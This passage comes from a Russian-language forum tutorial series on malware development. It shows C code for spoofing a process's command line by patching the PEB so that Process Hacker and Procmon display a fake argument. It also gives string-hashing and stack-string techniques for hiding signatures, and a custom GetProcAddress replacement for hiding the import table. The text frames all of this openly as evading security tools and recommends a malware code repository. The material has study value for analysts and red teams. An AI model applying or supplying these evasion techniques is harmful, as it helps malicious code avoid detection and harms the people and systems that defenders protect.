Короче говоря, эти инструменты ограничивают количество байт, считываемых из CommandLine.Buffer, равным CommandLine.Length, чтобы избежать чтения дополнительных ненужных байт в случае, если CommandLine.Buffer не завершен нулевым символом.<br />
<br />
Возможно обмануть эти инструменты, установив CommandLine.Length меньше размера буфера. Это позволяет контролировать, сколько полезной нагрузки внутри CommandLine.Buffer будет отображено. Это можно сделать, переписав адрес CommandLine.Length в удаленном процессе, передав желаемый размер буфера для чтения внешними инструментами.<br />
<br />
<b>Патчинг CommandLine.Length</b><br />
<br />
Следующий фрагмент кода патчит PEB-&gt;ProcessParameters.CommandLine.Length, чтобы ограничить то, что может читать Process Hacker только для powershell.exe. Сначала аргумент подмены устанавливается в &quot;Totally Legit Argument&quot;, а затем длина патчится, чтобы быть размером sizeof(L&quot;powershell.exe&quot;).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD dwNewLen = sizeof(L&quot;powershell.exe&quot;);

if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb-&gt;ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&amp;dwNewLen, sizeof(DWORD))){
  return FALSE;
}</code></pre>
	</div>
</div><br />
Демонстрация<br />
<br />
<b>Просмотр Process Hacker.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784252928.png"
		data-src="https://osint42.org/attachments/1746784252928-png.174/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784252928-png.174/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784252928.png"
			title="1746784252928.png"
			width="1454" height="850" loading="lazy" />
	</div><br />
<br />
<b>Procmon view.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784259970.png"
		data-src="https://osint42.org/attachments/1746784259970-png.175/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784259970-png.175/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784259970.png"
			title="1746784259970.png"
			width="1382" height="516" loading="lazy" />
	</div></div>
						

							<h2>Скрытие строк</h2>

							

							

							<div class="bbWrapper"><b>Хеширование</b> - это техника, используемая для создания фиксированного представления куска данных, называемого хеш-значением или хеш-кодом. Хеш-алгоритмы разработаны как односторонние функции, что означает, что вычислительно невозможно определить исходные входные данные, используя хеш-значение. Хеш-код обычно имеет более короткий размер и быстрее обрабатывается. При сравнении строк хеширование может использоваться для быстрого определения равенства двух строк, в сравнении с сравнением самих строк, особенно если строки длинные.<br />
<br />
В контексте разработки вредоносных программ хеширование строк полезно для скрытия строк, используемых в реализации, так как строки могут использоваться как сигнатуры для обнаружения вредоносных бинарных файлов.<br />
<br />
<b>Хеширование строк</b><br />
<br />
Давайте рассмотрим некоторые алгоритмы хеширования строк. Важно понимать, что результатом этих алгоритмов является число, выраженное в шестнадцатеричном формате, так как это более аккуратно и компактно.<br />
<br />
В этой статье рассматриваются следующие алгоритмы хеширования строк:<br />
<br />
Dbj2<br />
JenkinsOneAtATime32Bit<br />
LoseLose Rotr32<br />
<br />
Существует гораздо больше алгоритмов хеширования строк, чем те, которые обсуждаются в этой сьтатье, и некоторые из них можно найти в репозитории <a href="https://github.com/vxunderground/VX-API" target="_blank" class="link link--external" rel="noopener">VX-API на GitHub.</a><br />
<br />
<b>Рекомендую присмотреться к этому репозиторию, там очень много полезных модулей на С++ для разработки малвари и пентестинга.)<br />
<br />
Dbj2</b><br />
<br />
Dbj2 - это простой и быстрый алгоритм хеширования, в основном используемый для генерации хеш-значений для строк, но также применимый к другим типам данных. Он работает, итерируясь по символам во входной строке и используя каждый символ для обновления текущего хеш-значения согласно определенному алгоритму, который продемонстрирован в следующем фрагменте.<br />
<br />
hash = ((hash &lt;&lt; 5) + hash) + c<br />
<br />
hash - это текущее хеш-значение, c - текущий символ во входной строке, и &lt;&lt; - оператор битового сдвига влево.<br />
<br />
Результирующее хеш-значение - это положительное целое число, уникальное для входной строки. Известно, что Djb2 производит хорошее распределение хеш-значений, что приводит к низкой вероятности коллизий между разными строками и их соответствующими хеш-значениями.<br />
<br />
Реализация Djb2, представленная ниже, взята из репозитория VX-API на GitHub.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define INITIAL_HASH    3731  // добавлено для рандомизации хеширования
#define INITIAL_SEED    7     // генерация хешей Djb2 из строк ASCII
DWORD HashStringDjb2A(_In_ PCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash &lt;&lt; INITIAL_SEED) + Hash) + c;

    return Hash;
}

// генерация хешей Djb2 из строк в широких символах
DWORD HashStringDjb2W(_In_ PWCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash &lt;&lt; INITIAL_SEED) + Hash) + c;

    return Hash;
}</code></pre>
	</div>
</div><br />
<b>JenkinsOneAtATime32Bit</b><br />
<br />
Алгоритм JenkinsOneAtATime32Bit работает, итерируясь по символам во входной строке и инкрементально обновляя текущее хеш-значение в соответствии с значением каждого символа. Алгоритм обновления хеш-значения продемонстрирован в следующем фрагменте.<br />
<br />
hash += c; hash += (hash &lt;&lt; 10); hash ^= (hash &gt;&gt; 6); hash - текущее хеш-значение, а c - текущий символ во входной строке.<br />
<br />
Результирующее хеш-значение - это 32-битное целое число, уникальное для входной строки. Известно, что алгоритм JenkinsOneAtATime32Bit производит относительно хорошее распределение хеш-значений, что приводит к низкой вероятности коллизий между разными строками и их соответствующими хеш-значениями.<br />
<br />
Реализация JenkinsOneAtATime32Bit, представленная ниже, взята из репозитория VX-API на GitHub.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define INITIAL_SEED    7    // Генерация хешей JenkinsOneAtATime32Bit из строк ASCII
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

// Генерация хешей JenkinsOneAtATime32Bit из строк в широких символах
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}</code></pre>
	</div>
</div><br />
<b>Rotr32 </b><br />
<br />
Алгоритм хеширования строк Rotr32 использует итерируемые символы во входной строке для суммирования их ASCII-значений, а затем применяет битовое вращение к текущему значению хеша. Входное значение и счет (счет равен INITIAL_SEED) используются для выполнения сдвига вправо на это значение, затем применяется операция ИЛИ с исходным значением, сдвинутым влево на отрицание счета.<br />
<br />
Результирующее хеш-значение - это 32-битное целое число, уникальное для входной строки. Известно, что Rotr32 производит относительно хорошее распределение хеш-значений, что приводит к низкой вероятности коллизий между разными строками и их соответствующими хеш-значениями.<br />
<br />
Реализация Rotr32, представленная ниже, взята из репозитория VX-API на GitHub.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define INITIAL_SEED    5 // Вспомогательная функция, которая применяет битовое вращение
UINT32 HashStringRotr32Sub(UINT32 Value, UINT Count)
{
    DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
    Count &amp;= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (Value &gt;&gt; Count) | (Value &lt;&lt; ((-Count) &amp; Mask));
#pragma warning( pop )
}

// Генерация хешей Rotr32 из строк ASCII
INT HashStringRotr32A(_In_ PCHAR String)
{
    INT Value = 0;

    for (INT Index = 0; Index &lt; lstrlenA(String); Index++)
        Value = String[Index] + HashStringRotr32Sub(Value, INITIAL_SEED);

    return Value;
}

// Генерация хешей Rotr32 из строк в широких символах
INT HashStringRotr32W(_In_ PWCHAR String)
{
    INT Value = 0;

    for (INT Index = 0; Index &lt; lstrlenW(String); Index++)
        Value = String[Index] + HashStringRotr32Sub(Value, INITIAL_SEED);

    return Value;
}</code></pre>
	</div>
</div><br />
<b>Стек строки</b><br />
<br />
В языках программирования C/C++ строку можно представить как массив символов, разделяя символы друг от друга, что помогает избегать обнаружения на основе строк. Например, строку &quot;hello world&quot; можно представить следующим образом.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>char string[] = { &#039;h&#039;, &#039;e&#039;, &#039;l&#039;, &#039;l&#039;, &#039;o&#039;, &#039; &#039;, &#039;w&#039;, &#039;o&#039;, &#039;r&#039;, &#039;l&#039;, &#039;d&#039;, &#039;\0&#039; };</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746784427195.png"
		data-src="https://osint42.org/attachments/1746784427195-png.176/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784427195-png.176/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784427195.png"
			title="1746784427195.png"
			width="1920" height="732" loading="lazy" />
	</div><br />
<br />
Поиск строки &quot;hello world&quot; с использованием бинарного редактора HxD ничего не вернет.<br />
<br />
Однако стека строки недостаточно, чтобы скрыть строку от некоторых отладчиков и инструментов обратной разработки, так как они могут содержать плагины для их обнаружения.<br />
<br />
Рекомендуется также шифровать строки, если они используется в программе.)</div>
						

							<h2>Изучаем кунгфу-1. Скрытие таблицы импорта</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746784703357.png"
		data-src="https://osint42.org/attachments/1746784703357-png.177/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784703357-png.177/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784703357.png"
			title="1746784703357.png"
			width="1340" height="890" loading="lazy" />
	</div><br />
<br />
Таблица импортных адресов (IAT) содержит информацию о файле PE, такую как используемые функции и DLL, экспортирующие их. Этот тип информации может быть использован для создания сигнатуры и обнаружения двоичного кода.<br />
<br />
Например, изображение ниже показывает таблицу импортных адресов примера инъекции шелл-кода.<br />
Файл PE импортирует функции, которые считаются высоко подозрительными. Решения безопасности могут затем использовать эту информацию для детекта.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784712125.png"
		data-src="https://osint42.org/attachments/1746784712125-png.178/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784712125-png.178/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784712125.png"
			title="1746784712125.png"
			width="1212" height="954" loading="lazy" />
	</div><br />
<br />
<b>Сокрытие и обфускация IAT - Метод 1</b><br />
<br />
Чтобы скрыть функции от IAT, можно использовать GetProcAddress, GetModuleHandle или LoadLibrary для динамической загрузки этих функций во время выполнения. Приведенный ниже фрагмент загрузит VirtualAllocEx динамически, и поэтому он не появится в IAT при проверке.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef LPVOID (WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

//...
fnVirtualAllocEx pVirtualAllocEx = GetProcAddress(GetModuleHandleA(&quot;KERNEL32.DLL&quot;), &quot;VirtualAllocEx&quot;);
pVirtualAllocEx(...);</code></pre>
	</div>
</div><br />
<b>Хотя это может показаться элегантным решением, по ряду причин это не самый лучший способ:</b><br />
<br />
Во-первых, строка VirtualAllocEx существует в двоичном коде, что может быть использовано для обнаружения использования функции.<br />
GetProcAddress и GetModuleHandleA появятся в IAT, что само по себе используется как сигнатура.<br />
<br />
<b>Сокрытие и обфускация IAT - Метод 2</b><br />
<br />
Более элегантным решением является создание собственных функций, которые выполняют те же действия, что и GetProcAddress и GetModuleHandle WinAPIs.<br />
Таким образом, становится возможным динамически загружать функции без появления этих двух функций в IAT.<br />
<br />
Функция WinAPI GetProcAddress извлекает адрес экспортированной функции из указанного дескриптора модуля. Функция возвращает NULL, если имя функции не найдено в указанном дескрипторе модуля.<br />
<br />
В этой части будет реализована функция, заменяющая GetProcAddress. Прототип новой функции показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {}</code></pre>
	</div>
</div><br />
<b>Как работает GetProcAddress</b><br />
<br />
Первый момент, который необходимо учесть, - это то, как адрес функции находится и извлекается с помощью WinAPI GetProcAddress.<br />
<br />
Параметр hModule - это базовый адрес загруженной DLL. Это адрес, где модуль DLL находится в адресном пространстве процесса. Учитывая это, адрес функции находится путем перебора экспортированных функций в предоставленной DLL и проверки существования имени целевой функции. Если найдено соответствие, извлеките адрес.<br />
<br />
Для доступа к экспортированным функциям необходимо получить доступ к таблице экспорта DLL и просмотреть ее в поисках имени целевой функции.<br />
<br />
Таблица экспорта - это структура, определенная как IMAGE_EXPORT_DIRECTORY.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA от базы изображения
    DWORD   AddressOfNames;         // RVA от базы изображения
    DWORD   AddressOfNameOrdinals;  // RVA от базы изображения
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</code></pre>
	</div>
</div><br />
Для нас актуальны последние три элемента.<br />
<br />
AddressOfFunctions - указывает адрес массива адресов экспортированных функций.<br />
AddressOfNames - указывает адрес массива адресов имен экспортированных функций.<br />
AddressOfNameOrdinals - указывает адрес массива порядковых номеров для экспортированных функций.<br />
<br />
<b>Как получить каталог экспорта, IMAGE_EXPORT_DIRECTORY</b><br />
<br />
Пример кода:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

    // Делаем это, чтобы избежать приведения каждый раз при использовании &#039;hModule&#039;
    PBYTE pBase = (PBYTE) hModule;

    // Получаем заголовок DOS и проверяем подпись
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    // Получаем заголовки NT и проверяем подпись
    PIMAGE_NT_HEADERS    pImgNtHdrs    = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // Получаем необязательный заголовок
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;

    // Получаем таблицу экспорта изображения
    // Это каталог экспорта
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // ...
}</code></pre>
	</div>
</div><br />
<b>Доступ к экспортированным функциям</b><br />
<br />
После получения указателя на структуру IMAGE_EXPORT_DIRECTORY можно просмотреть экспортированные функции. Член NumberOfFunctions указывает количество функций, экспортированных hModule. В результате максимальное количество итераций цикла должно соответствовать NumberOfFunctions.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++){
  // Поиск целевой экспортированной функции
}</code></pre>
	</div>
</div><br />
<b>Построение логики поиска</b><br />
<br />
Следующим шагом является создание логики поиска для функций. Построение логики поиска требует использования AddressOfFunctions, AddressOfNames и AddressOfNameOrdinals, которые являются массивами, содержащими RVA, ссылающиеся на уникальную функцию в таблице экспорта.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _IMAGE_EXPORT_DIRECTORY {
    // ...
    // ...
    DWORD   AddressOfFunctions;     // RVA от базы изображения
    DWORD   AddressOfNames;         // RVA от базы изображения
    DWORD   AddressOfNameOrdinals;  // RVA от базы изображения
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</code></pre>
	</div>
</div><br />
Поскольку эти элементы являются RVA, к базовому адресу модуля, pBase, должен быть добавлен VA. Первые два фрагмента кода должны быть простыми. Они извлекают имя функции и адрес функции соответственно. Третий фрагмент извлекает порядковый номер функции, который объясняется подробно в следующем разделе.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Получение указателя на массив имен функций
PDWORD FunctionNameArray     = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);

// Получение указателя на массив адресов функций
PDWORD FunctionAddressArray     = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);

// Получение указателя на массив порядковых номеров функции
PWORD  FunctionOrdinalArray     = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);</code></pre>
	</div>
</div><br />
<b>Понимание порядковых номеров</b><br />
<br />
Порядковый номер функции - это целочисленное значение, представляющее позицию функции в таблице экспортированных функций в DLL. Таблица экспорта организована в виде списка (массива) указателей на функции, каждой функции присваивается порядковое значение на основе ее положения в таблице.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784733442.png"
		data-src="https://osint42.org/attachments/1746784733442-png.179/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784733442-png.179/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784733442.png"
			title="1746784733442.png"
			width="476" height="281" loading="lazy" />
	</div><br />
<br />
Важно отметить, что порядковое значение используется для идентификации адреса функции, а не ее имени. Таблица экспорта работает таким образом, чтобы обрабатывать случаи, когда имя функции недоступно или не уникально. Кроме того, получение адреса функции с помощью ее порядкового номера происходит быстрее, чем с помощью ее имени. По этой причине операционная система использует порядковый номер для извлечения адреса функции.<br />
<br />
Например, адрес VirtualAlloc равен FunctionAddressArray[порядковый номер VirtualAlloc], где FunctionAddressArray - это указатель массива адресов функции, извлеченный из таблицы экспорта.<br />
<br />
Учитывая это, следующий фрагмент кода выведет порядковое значение каждой функции в массиве функций указанного модуля.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Получение указателя на массив имен функций
PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);

// Получение указателя на массив адресов функций
PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);

// Получение указателя на массив порядковых номеров функции
PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

// Цикл по всем экспортированным функциям
for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++){

    // Получение имени функции
    CHAR* pFunctionName        = (CHAR*)(pBase + FunctionNameArray[i]);

    // Получение порядкового номера функции
    WORD wFunctionOrdinal = FunctionOrdinalArray[i];

    // Вывод
    printf(&quot;[ %0.4d ] NAME: %s -\t ORDINAL: %d\n&quot;, i, pFunctionName, wFunctionOrdinal);
}</code></pre>
	</div>
</div><br />
<b>Частичная демонстрация</b> <b>GetProcAddressReplacement </b><br />
<br />
Хотя GetProcAddressReplacement еще не завершена, теперь она должна выводить имена функций и их соответствующие порядковые номера.<br />
Чтобы проверить, что было построено до сих пор, вызовите функцию с следующими параметрами:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>GetProcAddressReplacement(GetModuleHandleA(&quot;ntdll.dll&quot;), NULL);</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746784747943.png"
		data-src="https://osint42.org/attachments/1746784747943-png.180/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784747943-png.180/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784747943.png"
			title="1746784747943.png"
			width="1014" height="1029" loading="lazy" />
	</div><br />
<br />
Как ожидалось, имя функции и порядковый номер функции выводятся на консоль.<br />
<br />
<b>Порядковый номер к адресу</b><br />
<br />
С помощью порядкового номера функции можно получить адрес функции.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Получение указателя на массив имен функций
PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);

// Получение указателя на массив адресов функций
PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);

// Получение указателя на массив порядковых номеров функции
PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

// Цикл по всем экспортированным функциям
for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++){

    // Получение имени функции
    CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

    // Получение порядкового номера функции
    WORD wFunctionOrdinal = FunctionOrdinalArray[i];

    // Получение адреса функции через ее порядковый номер
    PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);

    printf(&quot;[ %0.4d ] NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n&quot;, i, pFunctionName, pFunctionAddress, wFunctionOrdinal);
}</code></pre>
	</div>
</div><br />
Для проверки функциональности откройте notepad.exe с помощью xdbg и проверьте экспорт ntdll.dll.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784759860.png"
		data-src="https://osint42.org/attachments/1746784759860-png.181/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784759860-png.181/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784759860.png"
			title="1746784759860.png"
			width="1682" height="794" loading="lazy" />
	</div><br />
<br />
Изображение выше показывает, что адрес A_SHAUpdate равен 0x00007FFD384D2D10 как в xdbg, так и с использованием функции GetProcAddressReplacement. Однако обратите внимание, что порядковые номера для функции отличаются из-за того, что загрузчик Windows генерирует новый массив порядковых номеров для каждого процесса.<br />
<br />
<b>Код GetProcAddressReplacement</b><br />
<br />
Последний фрагмент кода, необходимый для завершения функции, - это способ сравнения экспортированных имен функций с целевым именем функции, lpApiName. Это легко сделать с помощью strcmp. Затем, наконец, верните адрес функции при совпадении.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

    // Делаем это, чтобы избежать приведения каждый раз при использовании &#039;hModule&#039;
    PBYTE pBase = (PBYTE)hModule;

    // Получение заголовка DOS и проверка подписи
    PIMAGE_DOS_HEADER    pImgDosHdr        = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    // Получение заголовков NT и проверка подписи
    PIMAGE_NT_HEADERS    pImgNtHdrs        = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // Получение необязательного заголовка
    IMAGE_OPTIONAL_HEADER    ImgOptHdr    = pImgNtHdrs-&gt;OptionalHeader;

    // Получение таблицы экспорта изображения
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Получение указателя на массив имен функций
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);

    // Получение указателя на массив адресов функций
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);

    // Получение указателя на массив порядковых номеров функции
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

    // Цикл по всем экспортированным функциям
    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++){

        // Получение имени функции
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

        // Получение адреса функции через его порядковый номер
        PVOID pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // Поиск указанной функции
        if (strcmp(lpApiName, pFunctionName) == 0){
            printf(&quot;[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n&quot;, i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return pFunctionAddress;
        }
    }

    return NULL;
}</code></pre>
	</div>
</div><br />
<b>Финальная демонстрация</b> <b>GetProcAddressReplacement </b><br />
<br />
